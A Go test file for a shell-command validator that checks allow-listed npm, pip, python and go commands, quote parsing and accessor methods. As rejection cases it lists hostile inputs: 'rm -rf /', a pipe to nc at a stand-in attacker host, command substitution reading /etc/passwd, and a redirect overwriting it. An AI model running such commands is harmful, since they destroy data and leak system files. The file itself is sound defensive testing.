package values_test

import (
	"testing"

	"github.com/glive/domain/values"
	"github.com/glive/testing/testutil"
)

func TestCommandValidator_Validate(t *testing.T) {
	validator := values.NewCommandValidator()

	tests := []struct {
		name    string
		command string
		wantErr bool
		errCode string
	}{
		{"valid npm command", "npm install", false, ""},
		{"valid pip command", "pip install -r requirements.txt", false, ""},
		{"valid python command", "python -m venv venv", false, ""},
		{"valid go command", "go build ./...", false, ""},
		{"empty command", "", true, "CMD_EMPTY"},
		{"semicolon injection", "npm install; rm -rf /", true, "CMD_BLOCKED_PATTERN"},
		{"pipe injection", "npm install | nc attacker.com 1234", true, "CMD_BLOCKED_PATTERN"},
		{"backtick injection", "npm install `whoami`", true, "CMD_BLOCKED_PATTERN"},
		{"command substitution", "npm install $(cat /etc/passwd)", true, "CMD_BLOCKED_PATTERN"},
		{"redirect injection", "npm install > /etc/passwd", true, "CMD_BLOCKED_PATTERN"},
		{"null byte", "npm install\x00rm -rf /", true, "CMD_NULL_BYTE"},
		// "rm -rf /" matches the dangerous-command blocked pattern, and blocked
		// patterns are checked before the allow-list, so it is rejected as
		// CMD_BLOCKED_PATTERN. That order is deliberate — the more specific,
		// higher-signal rule wins — so this case asserts what the validator returns.
		{"blocked dangerous executable", "rm -rf /", true, "CMD_BLOCKED_PATTERN"},
		// Exercises the allow-list itself: "perl" is not allow-listed and matches no
		// blocked pattern, so it is the case that genuinely reaches CMD_NOT_ALLOWED.
		{"not allowed executable", "perl script.pl", true, "CMD_NOT_ALLOWED"},
		{"command too long", string(make([]byte, 5000)), true, "CMD_TOO_LONG"},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			validated, err := validator.Validate(tt.command, "/tmp")
			if tt.wantErr {
				if err == nil {
					t.Errorf("expected error, got nil")
					return
				}
				if tt.errCode != "" {
					testutil.AssertContains(t, err.Error(), tt.errCode)
				}
				return
			}
			if err != nil {
				t.Fatalf("unexpected error: %v", err)
			}

			if validated.Executable() == "" {
				t.Error("executable should not be empty")
			}
		})
	}
}

func TestCommandValidator_QuoteHandling(t *testing.T) {
	validator := values.NewCommandValidator()

	// wantArgs counts the arguments AFTER the executable, matching Args(), which
	// excludes it. The assertion below previously compared len(Args())+1 — the
	// number of whole parts — against these values, so every row was off by one
	// against its own field name.
	tests := []struct {
		name     string
		command  string
		wantArgs int
	}{
		{"simple command", "npm install", 1},
		{"command with args", "npm install express", 2},
		{"quoted args", "npm install \"express@latest\"", 2},
		{"single quoted args", "npm install 'express@latest'", 2},
		{"mixed quotes", "npm install \"express\" 'lodash'", 3},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			validated, err := validator.Validate(tt.command, "/tmp")
			if err != nil {
				// Some commands may fail validation due to quotes being interpreted as shell operators
				// This is expected behavior
				return
			}

			if len(validated.Args()) != tt.wantArgs {
				t.Errorf("expected %d args, got %d (%q)", tt.wantArgs, len(validated.Args()), validated.Args())
			}
		})
	}
}

func TestValidatedCommand_Methods(t *testing.T) {
	validator := values.NewCommandValidator()
	cmd := "npm install express"
	workingDir := "/tmp/project"

	validated, err := validator.Validate(cmd, workingDir)
	testutil.AssertNoError(t, err)

	if validated.Executable() != "npm" {
		t.Errorf("expected executable npm, got %s", validated.Executable())
	}

	if len(validated.Args()) < 1 {
		t.Error("expected at least one argument")
	}

	if validated.String() != cmd {
		t.Errorf("expected original command %q, got %q", cmd, validated.String())
	}

	if validated.WorkingDir() != workingDir {
		t.Errorf("expected working dir %q, got %q", workingDir, validated.WorkingDir())
	}
}
